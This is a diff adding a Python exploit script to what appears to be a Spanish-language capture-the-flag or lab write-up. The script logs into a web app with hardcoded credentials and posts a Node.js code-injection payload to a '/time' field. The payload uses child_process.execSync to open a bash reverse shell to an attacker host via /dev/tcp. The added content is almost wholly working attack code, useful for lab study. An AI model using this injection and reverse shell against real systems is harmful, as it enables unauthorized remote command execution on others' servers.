@@ -748,6 +748,63 @@ root@de0610f51845:/usr/src/app#
 
 ```
 
+Aqui dejo un pequeño exploit de la automatizacion para ganar la shell en py:
+
+``` py
+
+import requests
+
+
+url = "http://10.114.130.5:8080"
+user = "chris-r"
+password = "letmein"
+s = requests.Session()
+lhost = "192.168.136.105"
+lport = "4444"
+
+def auth():
+
+     data = {"username":f"{user}", "password":f"{password}"}
+     try:
+
+         r = s.post(url + "/auth", data=data, timeout=10)
+
+         if "login" in r.text:
+
+             print("[-] Login failed")
+
+         print(f"[+] Login successfull: {r.status_code}")
+
+     except Exception as e:
+
+             print(f"Error: {e}")
+
+def send_payload():
+
+     payload = f'''require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")'''
+     data = {"time":payload}
+
+     try:
+
+         r = s.post(url + "/time", data=data, timeout=10)
+
+         print(f"Payload enviado: {r.status_code}")
+
+     except Exception as e:
+
+                print(f"Error: {e}")
+def main():
+
+    auth()
+    send_payload()
+
+
+if __name__ == "__main__":
+
+           main()
+
+```
+
 ``` bash
 
 root@de0610f51845:/usr/src/app# whoami
